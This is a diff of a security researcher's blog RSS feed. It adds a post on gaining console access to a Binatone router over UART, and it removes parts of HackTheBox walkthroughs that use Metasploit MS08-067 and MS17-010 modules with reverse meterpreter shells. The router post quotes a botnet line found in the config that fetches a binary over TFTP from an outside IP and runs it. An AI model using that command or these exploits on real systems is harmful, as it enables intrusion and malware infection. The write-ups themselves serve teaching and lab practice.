@@ -1,4 +1,47 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Sheeraz Ali]]></title><description><![CDATA[AI & offensive security researcher. CTO at Pwned Labs. AI/LLM pentesting specialist — 245 pentests, 28+ CVEs, 300+ Hack The Box labs. OSCP & CREST certified.]]></description><link>https://sheerazali.com/</link><image><url>https://sheerazali.com/favicon.png</url><title>Sheeraz Ali</title><link>https://sheerazali.com/</link></image><generator>Ghost 5.130</generator><lastBuildDate>Tue, 21 Jul 2026 03:19:40 GMT</lastBuildDate><atom:link href="https://sheerazali.com/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Raining CVE's on wordpress plugins using Semgrep Slide Deck]]></title><description><![CDATA[<p>Here are the slide deck for the Nullcon Talk me and <a href="http://shreyapohekar.com/?ref=localhost" rel="noreferrer noopener nofollow">Shreya</a> presented.</p><p><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Presentation for nullcon 2022</a><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Download</a></p><p>And here are the Demo videos for both semgroup and XSS bomb.</p><p>Basic Semgrep usage</p><p>XSS bomb in action</p><p>XSS bomb in action</p>]]></description><link>https://sheerazali.com/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/</link><guid isPermaLink="false">695bded9f2cd8900016e8589</guid><category><![CDATA[Security]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Sat, 10 Sep 2022 03:04:54 GMT</pubDate><media:content url="https://sheerazali.com/content/images/migrated/2022-09-Screenshot-2022-09-10-at-8.40.09-AM.png" medium="image"/><content:encoded><![CDATA[<img src="https://sheerazali.com/content/images/migrated/2022-09-Screenshot-2022-09-10-at-8.40.09-AM.png" alt="Raining CVE&apos;s on wordpress plugins using Semgrep Slide Deck"><p>Here are the slide deck for the Nullcon Talk me and <a href="http://shreyapohekar.com/?ref=localhost" rel="noreferrer noopener nofollow">Shreya</a> presented.</p><p><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Presentation for nullcon 2022</a><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Download</a></p><p>And here are the Demo videos for both semgroup and XSS bomb.</p><p>Basic Semgrep usage</p><p>XSS bomb in action</p><p>XSS bomb in action</p>]]></content:encoded></item><item><title><![CDATA[Shibboleth Writeup / Walkthrough Hack the box]]></title><description><![CDATA[Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database]]></description><link>https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/</link><guid isPermaLink="false">695bded9f2cd8900016e8588</guid><category><![CDATA[HackTheBox]]></category><category><![CDATA[Writeup]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Thu, 10 Feb 2022 14:20:12 GMT</pubDate><media:content url="https://sheerazali.com/content/images/migrated/2022-02-shibboleht.jpg" medium="image"/><content:encoded><![CDATA[<h1 id="tldr">TL;DR</h1><img src="https://sheerazali.com/content/images/migrated/2022-02-shibboleht.jpg" alt="Shibboleth Writeup / Walkthrough Hack the box"><p><br>This is a walkthrough writeup on Shibboleth which is a Linux box categorized as medium difficulty on HackTheBox.The initial foothold was gained by dumping the IPMI password hashes through the <code>asf-rmcp</code> service running on UDP port <code>623</code> &amp; leveraging these credentials to get code execution through the Zabbix server dashboard. Lateral privesc was made possible through password reuse. Privilege escalation to <code>root</code> user was gained by exploiting an <code>eval</code> injection vulnerability in the MariabDB database version that was being used on the box.</p><h1 id="walkthrough">Walkthrough</h1><h2 id="shibboleth-writeup-scanning-network">Shibboleth Writeup: Scanning Network</h2><p>Scanning ports with Nmap :</p><pre><code class="language-markdown">Command : nmap -p 80 -sC -sV -A -n -Pn -oN nmap.initial 10.10.11.124
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Sheeraz Ali]]></title><description><![CDATA[AI & offensive security researcher. CTO at Pwned Labs. AI/LLM pentesting specialist — 245 pentests, 28+ CVEs, 300+ Hack The Box labs. OSCP & CREST certified.]]></description><link>https://sheerazali.com/</link><image><url>https://sheerazali.com/favicon.png</url><title>Sheeraz Ali</title><link>https://sheerazali.com/</link></image><generator>Ghost 5.130</generator><lastBuildDate>Mon, 19 Oct 2026 14:56:04 GMT</lastBuildDate><atom:link href="https://sheerazali.com/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[I Hacked a Router With 3 Wires. The Password Was "password"]]></title><description><![CDATA[My first time with a multimeter and UART: finding the pads, an hour wasted wiring into VCC, debug-mode access, dumping the flash, cracking the config compression, and the password that was printed on the sticker the whole time.]]></description><link>https://sheerazali.com/blog/i-hacked-a-router-with-3-wires-the-password-was-password/</link><guid isPermaLink="false">6ad62ce672e63c000139839b</guid><category><![CDATA[Hardware Hacking]]></category><category><![CDATA[IoT]]></category><category><![CDATA[UART]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Mon, 19 Oct 2026 14:44:54 GMT</pubDate><media:content url="https://sheerazali.com/content/images/2026/10/thumbnail.png" medium="image"/><content:encoded><![CDATA[<img src="https://sheerazali.com/content/images/2026/10/thumbnail.png" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;"><p>This was my first proper hardware hacking attempt. I&apos;d never used a multimeter before, never touched UART, never soldered anything this small. I had an old <strong>Binatone DT 850W</strong> ADSL router lying around and I wanted to see if I could get into it through the board instead of over the network. This is everything I did, including the hour I wasted wiring it wrong.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/01-router-label.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>The router. Keep an eye on that label, it matters later.</em></p><h2 id="what-uart-even-is">What UART even is</h2><p>Most routers have a serial console on the board called UART. The engineers use it to watch the device boot and debug it, and they almost never remove it. If you can talk to it you usually get the boot log, a login prompt, sometimes a shell. You only need three lines: <strong>GND</strong> (ground), <strong>TX</strong> (the router transmits), and <strong>RX</strong> (the router receives).</p><p>So I opened it up.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/02-board-full.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>First look inside. The big chip in the middle is the SoC.</em></p><p>The main chip is a <strong>Ralink RT63365E</strong>, a small MIPS system-on-chip. Next to it is the RAM and the flash.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/03-chip-flash.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>The RT63365E and the flash chip (the long one up top). The flash is 2 MB and holds the whole firmware and config.</em></p><p>To talk to UART I used a cheap red <strong>FTDI</strong> USB-to-serial adapter. It just converts the router&apos;s serial into something my laptop can read over USB.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/14-web-c.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>The adapter. The pins I care about are RX, TX and GND. That little jumper sets 3.3V or 5V.</em></p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/uart_solder_1.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>The actual one I used.</em></p><p>One thing I read everywhere and it&apos;s true: you cross TX and RX. Router TX goes to adapter RX, router RX goes to adapter TX. If you wire them straight you get nothing. I did not fully respect this and it cost me later.</p><h2 id="finding-the-pads-with-a-multimeter">Finding the pads with a multimeter</h2><p>On the board there are four pads in a row next to the chip. That&apos;s the UART header.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/06-uart-pads.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>Four pads. One is GND, one is TX, one is RX, one is VCC. The board doesn&apos;t label them.</em></p><p>That&apos;s the problem, nothing is labelled, and if you put power (VCC) on the wrong wire you can damage something. I looked up the pinout for boards like this and people said it&apos;s usually GND, TX, RX, VCC top to bottom.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/12-web-a.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>What the forums said it should be. My board didn&apos;t match this.</em></p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/13-web-b.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>So I numbered my pads 1 to 4 and decided to measure each one myself.</em></p><p>I&apos;d never used a multimeter so I bought a cheap one and watched a couple of videos.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/08-multimeter.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>My first multimeter.</em></p><p>The method is simple: black probe on a known ground, red probe on each pad, read the voltage. I powered the router on and probed all four.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/07-probing.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>Probing a live board. Don&apos;t slip and short two pads.</em></p><p>Here&apos;s what I got, in order:</p>
+<!--kg-card-begin: html-->
+<table>
+<thead>
+<tr class="header">
+<th>Pad</th>
+<th>Reading</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>3.336 V, steady</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>~3.5 V, fluctuating</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>0 V</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>3.366 V, steady</td>
+</tr>
+</tbody>
+</table>
+<!--kg-card-end: html-->
+<p>Pad 3 reads 0 V so that&apos;s GND, easy. But here&apos;s what I didn&apos;t know: a voltage reading can&apos;t tell TX from RX. An idle TX sits high around 3.3V, and an idle RX pulled up also sits around 3.3V. Pads 1 and 4 looked identical. So I just guessed.</p><h2 id="the-hour-i-wasted-wiring-it-wrong">The hour I wasted (wiring it wrong)</h2><p>I soldered a wire onto each pad.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/11-whatsapp-b.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>First time soldering onto pads this small. The joints aren&apos;t pretty.</em></p><p>I set pad 3 as GND, guessed pad 4 was TX, wired it to the adapter and opened the console at 115200 baud, which is the usual router speed. Nothing came out. I tried 57600, 9600, 38400. Still nothing, not even garbage.</p><p>That turned out to be the clue. A wrong baud rate gives you garbage, random symbols on screen. I was getting zero bytes, total silence. Silence means nothing is reaching the adapter at all, which means either GND isn&apos;t connected or the pad I picked as TX isn&apos;t TX.</p><p>To check the adapter itself I did a loopback test, bridged the adapter&apos;s own TX to its own RX and sent some text:</p><pre><code>sent:     LOOPBACK_TEST_12345
+received: LOOPBACK_TEST_12345</code></pre><p>It came back clean, so the adapter was fine. The problem was the board side.</p><p>Then it made sense. Pad 2 was the one reading ~3.5V and fluctuating, which I&apos;d ignored as &quot;probably power.&quot; I had it backwards:</p><ul><li>A steady voltage is a power rail. That was <strong>pad 4</strong>, the one I&apos;d wired my TX into. So I&apos;d been sending my keystrokes straight into the router&apos;s VCC pin. No wonder it did nothing, and connecting it even messed with the boot.</li><li>A fluctuating voltage is a line with activity. That was <strong>pad 2</strong>, the actual RX.</li></ul><p>So I moved my TX wire off pad 4 (VCC) and onto pad 2 (RX). GND on pad 3, read from pad 1, talk to pad 2.</p><h2 id="getting-a-response">Getting a response</h2><p>I pressed Enter and finally got something back:</p><pre><code>                   Enter Password : XXXX
+Password is not correct</code></pre><p>That &quot;Password is not correct&quot; was the first sign the router was actually listening to me. Two-way console working.</p><figure class="kg-card kg-image-card"><img src="https://sheerazali.com/content/images/2026/10/10-whatsapp-a.jpg" class="kg-image" alt="I Hacked a Router With 3 Wires. The Password Was &quot;password&quot;" loading="lazy"></figure><p><em>Everything connected, and a router LED is on, so it&apos;s alive.</em></p><h2 id="into-debug-mode">Into debug mode</h2><p>Before trying passwords I looked at the start of the boot log:</p><pre><code>RT63365 at Tue May 8 2012 version 0.8
+...
+Press any key to enter debug mode within 3 seconds.</code></pre><p>So there&apos;s a 3 second window at boot where pressing a key drops you into a bootloader debug mode. I power-cycled and spammed Enter, and got in:</p><pre><code>Enter Debug Mode
+ATHE
+======= Debug Command Listing =======
+ATSE        show the seed of password generator
+ATDUx,y     dump memory contents from address x for length y
+ATTD        download router configuration to PC
+ATUR        upload router firmware to flash ROM</code></pre><p>This runs below the OS. The router isn&apos;t Linux (it&apos;s ZyNOS, so there&apos;s no shell to pop), and this debug mode is basically the lowest level access you get, raw read and write of flash and memory. <code>ATDU</code> lets you read memory out over serial, so I used it to dump the whole 2 MB flash in 16 KB chunks:</p><pre><code>off=2048000 addr=bfdf4000 OK
+DONE size=2097152</code></pre><p>2 MB, no failed chunks. Now I had the full firmware and config on my laptop to look at offline.</p><h2 id="the-config-was-compressed">The config was compressed</h2><p>The admin password is stored in the config. I pulled the config out of the flash dump and ran strings on it expecting to see the password, but it was just high entropy bytes and runs of <code>FF</code>. The config was compressed.</p><p>I tried the usual decompressors and brute-forced a bunch of formats, none worked. Then I found it: ZyNOS compresses this with LZS, and the compressed stream doesn&apos;t start at byte 0, there&apos;s a 9 byte header in front. Pointing the LZS decoder at byte 9 worked:</p><pre><code>0x1a:  C&quot;&quot;&quot;password&quot;&quot;&quot;...&quot;&quot;&quot;&quot;DT850W</code></pre><p>The admin password was literally <code>password</code>.</p><p>And then I remembered the sticker on the bottom of the router. Go back to the first photo:</p><blockquote>Default Settings, Username: admin, Password: password</blockquote><p>It was printed on the box the whole time. I dumped 2 MB of flash and reverse-engineered the config compression to recover a password that&apos;s printed on every unit. Typed it in and got the command prompt:</p><pre><code>DT850W&gt;
+Valid commands are:
+sys    exit    ether    wan    etherdbg    tcephydbg
+ip     bridge  dot1q    pktqos show        set        lan</code></pre><p><code>DT850W&gt;</code> is the router&apos;s command line. That&apos;s full admin access on the device.</p><h2 id="the-part-i-didnt-expect">The part I didn&apos;t expect</h2><p>While reading the decompressed config, one field wasn&apos;t a setting, it was a command:</p><pre><code>cd /tmp;tftp -l4 -r4 -g 122.168.59.220 17109;chmod 777 4;./4</code></pre><p>That downloads a file called <code>4</code> from 122.168.59.220, makes it executable and runs it. That&apos;s not a router setting, that&apos;s a botnet payload, the kind of thing IoT malware drops to pull its binary from a C2 server and run it on reboot. So something had already gotten into this router (probably through that same default password) and left itself a download-and-run in the config. I came to read a password and found the thing was already infected.</p><h2 id="what-i-took-away-from-it">What I took away from it</h2><ul><li>You can start from zero on this. I&apos;d never used a multimeter or soldered small pads, and three wires got me full access to the device.</li><li>The multimeter only really finds GND for you. Telling TX from RX is deduction and a loopback test, not the meter.</li><li>No output and wrong output are different. Garbage means wrong baud. Silence means wrong wiring. That&apos;s what finally got me out of the VCC mistake.</li><li>The password was printed on the sticker. All the flash dumping and decompression recovered a default password. That happens more than you&apos;d think.</li><li>Cheap routers are soft targets. This one was already infected, and the pads to get in are sitting right there under the lid.</li></ul><p>If you have an old router lying around, open it up, find the pads, cross your wires, set 115200 and see what it says.</p>]]></content:encoded></item><item><title><![CDATA[Raining CVE's on wordpress plugins using Semgrep Slide Deck]]></title><description><![CDATA[<p>Here are the slide deck for the Nullcon Talk me and <a href="http://shreyapohekar.com/?ref=localhost" rel="noreferrer noopener nofollow">Shreya</a> presented.</p><p><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Presentation for nullcon 2022</a><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Download</a></p><p>And here are the Demo videos for both semgroup and XSS bomb.</p><p>Basic Semgrep usage</p><p>XSS bomb in action</p><p>XSS bomb in action</p>]]></description><link>https://sheerazali.com/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/</link><guid isPermaLink="false">695bded9f2cd8900016e8589</guid><category><![CDATA[Security]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Sat, 10 Sep 2022 03:04:54 GMT</pubDate><media:content url="https://sheerazali.com/content/images/migrated/2022-09-Screenshot-2022-09-10-at-8.40.09-AM.png" medium="image"/><content:encoded><![CDATA[<img src="https://sheerazali.com/content/images/migrated/2022-09-Screenshot-2022-09-10-at-8.40.09-AM.png" alt="Raining CVE&apos;s on wordpress plugins using Semgrep Slide Deck"><p>Here are the slide deck for the Nullcon Talk me and <a href="http://shreyapohekar.com/?ref=localhost" rel="noreferrer noopener nofollow">Shreya</a> presented.</p><p><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Presentation for nullcon 2022</a><a href="https://sheerazali.com/wp-content/uploads/2022/09/Realpresented.pptx">Download</a></p><p>And here are the Demo videos for both semgroup and XSS bomb.</p><p>Basic Semgrep usage</p><p>XSS bomb in action</p><p>XSS bomb in action</p>]]></content:encoded></item><item><title><![CDATA[Shibboleth Writeup / Walkthrough Hack the box]]></title><description><![CDATA[Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database]]></description><link>https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/</link><guid isPermaLink="false">695bded9f2cd8900016e8588</guid><category><![CDATA[HackTheBox]]></category><category><![CDATA[Writeup]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Thu, 10 Feb 2022 14:20:12 GMT</pubDate><media:content url="https://sheerazali.com/content/images/migrated/2022-02-shibboleht.jpg" medium="image"/><content:encoded><![CDATA[<h1 id="tldr">TL;DR</h1><img src="https://sheerazali.com/content/images/migrated/2022-02-shibboleht.jpg" alt="Shibboleth Writeup / Walkthrough Hack the box"><p><br>This is a walkthrough writeup on Shibboleth which is a Linux box categorized as medium difficulty on HackTheBox.The initial foothold was gained by dumping the IPMI password hashes through the <code>asf-rmcp</code> service running on UDP port <code>623</code> &amp; leveraging these credentials to get code execution through the Zabbix server dashboard. Lateral privesc was made possible through password reuse. Privilege escalation to <code>root</code> user was gained by exploiting an <code>eval</code> injection vulnerability in the MariabDB database version that was being used on the box.</p><h1 id="walkthrough">Walkthrough</h1><h2 id="shibboleth-writeup-scanning-network">Shibboleth Writeup: Scanning Network</h2><p>Scanning ports with Nmap :</p><pre><code class="language-markdown">Command : nmap -p 80 -sC -sV -A -n -Pn -oN nmap.initial 10.10.11.124
 Nmap scan report for 10.10.11.124
 Host is up (0.26s latency).
 
@@ -2033,259 +2076,4 @@ msf5 exploit(multi/handler) &gt; options
     SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
  msf5 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1
  SESSION =&gt; 1
- msf5 post(multi/recon/local_exploit_suggester) &gt; run</code></pre><p>OK so we have some interesting results,</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-95.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="188"><figcaption>x86 results from local_exploit_suggester</figcaption></figure><p>Also, because we are running an x86 architecture meterpreter session on an x64 architecture box, we should additionally try to migrate our meterpreter session to an x64 architecture and re-run the &#x201C;<code>local_exploit_suggester</code>&#x201D; module as they may return different results.</p><h5 id="arctic-writeup-migrating-meterpreter-shell">Arctic Writeup: Migrating meterpreter shell</h5><p>So, lets migrate our <strong>x86</strong> meterpreter session into an <strong>x64</strong> version.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-96.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="120"><figcaption>checking running processes</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_ps-1.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="715"><figcaption>checking the running processes to migrate to</figcaption></figure><p>Let&#x2019;s choose a process with <strong>x64 Architecture</strong>,<br>I will be avoiding &#x201C;<code>powershell.exe</code>&#x201D; because using it may cause this process to die, and if &#x201C;<code>powershell.exe&quot;</code> dies our meterpreter session dies.<br>Let&#x2019;s use &#x201C;<code>jrun.exe&quot;</code> with &#x201C;pid = 1140&#x201C;</p><p>So. now we have successfully migrated into an <strong>x64 </strong>version meterpreter session. Lets re-run the &#x201C;<code>local_exploit_suggester&quot;</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_screenshot-5.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="373"><figcaption>x64 results from local_exploit_suggester</figcaption></figure><p>Comparing the two results from <strong>x86</strong> session and <strong>x64</strong> session, we can deduce that &#x201C;<code>exlpoit/windows/local/ms10_092_scelevator</code>&#x201D; which is ideal for escalating privileges is common to both. Let&#x2019;s try the exploit &#x201C;<code><strong><a href="//www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS10-092/" rel="noreferrer noopener">ms10_092</a></strong></code>&#x201C;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_05_image-99.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="770" height="604"><figcaption>windows/local/ms10_092_schelevator</figcaption></figure><p>Awesome! &#x1F973; We are <strong>AUTHORITY\SYSTEM</strong> . Here&#x2019;s the root flag.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_screenshot-6.png" class="kg-image" alt="Arctic Writeup / Walkthrough Hack the box" loading="lazy" width="665" height="606"></figure><p>Until next box, checkout other intriguing writeups <a href="https://sheerazali.com/">here</a></p>]]></content:encoded></item><item><title><![CDATA[Legacy Writeup/Walkthrough Hack the box]]></title><description><![CDATA[This writeup is based on Legacy on Hack the box. It was a windows box. It starts with Samba, which has two bugs to exploit and get the shell.]]></description><link>https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/</link><guid isPermaLink="false">695bded9f2cd8900016e8578</guid><category><![CDATA[HackTheBox]]></category><category><![CDATA[Writeup]]></category><dc:creator><![CDATA[sheeraz ali]]></dc:creator><pubDate>Thu, 20 May 2021 11:52:44 GMT</pubDate><content:encoded><![CDATA[<h2 id="legacy-writeup-summary">Legacy Writeup Summary</h2><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_Legacy-Cover-edited.png" class="kg-image" alt loading="lazy" width="736" height="471"></figure><h2 id="tldr">TL;DR</h2><p>This writeup is based on <a href="//www.hackthebox.eu/home/machines/profile/2">Legacy</a> on Hack the box. It was a windows box. It starts with Samba. In this machine, Samba has two bugs, which are SMB vulnerability(Eternal Blue or MS17-010) and Remote Code Execution vulnerability (MS08-067). We have both ways to exploit the vulnerability and get the shell. In this write-up, we will see both ways of exploitation. There is no privilege escalation needed for the user flag and root flag.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I started with a Nmap scan, I found ports 139, 445 as NetBIOS-ssn and Microsoft-ds, respectively. Let&#x2019;s do an intense scan ( -sV -A -T4 -vv) and with vulnerability script to identify more information about the machine. Let&#x2019;s see the Nmap results.</p><pre><code class="language-bash">nmap -sV -A -T4 -vv --script vuln 10.129.1.111                                                                                          Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 10:32 EDT
-Discovered open port 445/tcp on 10.129.1.111
-Discovered open port 139/tcp on 10.129.1.111
- PORT     STATE   SERVICE          VERSION
- 139/tcp  open    netbios-ssn    Microsoft Windows netbios-ssn
- 445/tcp  open    microsoft-ds   Microsoft Windows XP microsoft-ds
-
-Host script results:
- |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
- | smb-vuln-ms08-067: 
- |   VULNERABLE:
- |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
- |     State: VULNERABLE
- |     IDs:  CVE:CVE-2008-4250
- |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
- |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
- |           code via a crafted RPC request that triggers the overflow during path canonicalization.
- |           
- |     Disclosure date: 2008-10-23
- |     References:
- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
- |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
- |_smb-vuln-ms10-054: false
- |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
- | smb-vuln-ms17-010: 
- |   VULNERABLE:
- |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
- |     State: VULNERABLE
- |     IDs:  CVE:CVE-2017-0143
- |     Risk factor: HIGH
- |       A critical remote code execution vulnerability exists in Microsoft SMBv1
- |        servers (ms17-010).
- |           
- |     Disclosure date: 2017-03-14
- |     References:
- |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
- |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-</code></pre><p>In the Nmap scan we got Samba&#x2019;s version which is &#x201C;Windows XP Microsoft-ds&#x201D; using Nmap&#x2019;s vulnerability scripts, we identified that the target is vulnerable to MS08-067 and MS17-010. Since we have Remote Code Execution and Samba SMBv1 exploitation. Now, let&#x2019;s move to exploitation phase.</p><h2 id="legacy-writeup-exploitation">Legacy writeup Exploitation</h2><p>Let&#x2019;s find the exploit using <a href="//www.metasploit.com/">Metasploit</a>.</p><h3 id="ms08-067-using-metasploit">MS08-067 (Using Metasploit)</h3><pre><code class="language-bash">msf6 &gt; search ms08-067
- Matching Modules
- #  Name                                 Disclosure Date  Rank   Check  Description
-    ----                                 ---------------  ----   -----  -----------
- 0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service     
-                                                                        Relative Path Stack Corruption </code></pre><p>MS08-067 is a remote code execution vulnerability that allows attackers to take complete control of an affected system remotely. On Microsoft Windows 2000-based, Windows XP-based, and Windows Server 2003-based systems, an attacker could exploit this vulnerability over RPC without authentication and could run arbitrary code. So we will use &#x201C;use 0&#x201D; to select the exploit and change the options into it.</p><pre><code class="language-bash">msf6 &gt; use 0
-msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options
-Module options (exploit/windows/smb/ms08_067_netapi):
-Name     Current Setting  Required  Description
-----     ---------------  --------  -----------
-RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &apos;file:&apos;
-RPORT    445              yes       The SMB service port (TCP)
-SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
-Payload options (windows/meterpreter/reverse_tcp):
- Name      Current Setting  Required  Description
- ----      ---------------  --------  -----------
- EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)
- LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
- LPORT     4444             yes       The listen port
- 
- msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.129.1.111
- RHOSTS =&gt; 10.129.1.111
- msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST tun0
- LHOST =&gt; 10.10.14.44
- msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit
-
- meterpreter &gt; shell
- Process 1916 created.
- Channel 1 created.
- Microsoft Windows XP [Version 5.1.2600]
- (C) Copyright 1985-2001 Microsoft Corp.
- C:\WINDOWS\system32&gt;</code></pre><p>To know about RHOSTS, LHOST, RPORT, and LPORT take reference from my <a href="https://sheerazali.com/lame-writeup-walkthrough-hack-the-box/">Lame</a> writeup. With this exploit, we get the shell. Now, let&#x2019;s move to another exploit (MS17-010).</p><h3 id="ms017-010-using-metasploit">MS017-010 (Using Metasploit)</h3><pre><code class="language-bash">msf6 &gt; search ms17-010
- Matching Modules
- #  Name                                           Disclosure Date  Rank     Check  Description
-    ----                                           ---------------  ----     -----  -----------
- 0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
- 1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
- 2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
- 3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
- 4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
